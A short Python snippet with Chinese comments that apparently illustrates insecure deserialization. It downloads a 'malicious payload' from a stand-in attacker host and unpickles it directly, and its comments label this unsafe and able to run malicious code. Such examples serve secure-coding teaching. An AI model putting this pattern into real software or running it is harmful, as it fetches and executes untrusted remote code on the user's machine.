import pickle
import urllib.request

# 从一个恶意的 URL 下载序列化的 payload
url = "https://evildojo.com/malicious_payload"
response = urllib.request.urlopen(url)

# 使用 pickle.load 反序列化下载的内容（不安全示例）
malicious_object = pickle.load(response)  # 反序列化时可能会执行恶意代码

# 打印反序列化后的对象内容
print(malicious_object)
response.close()
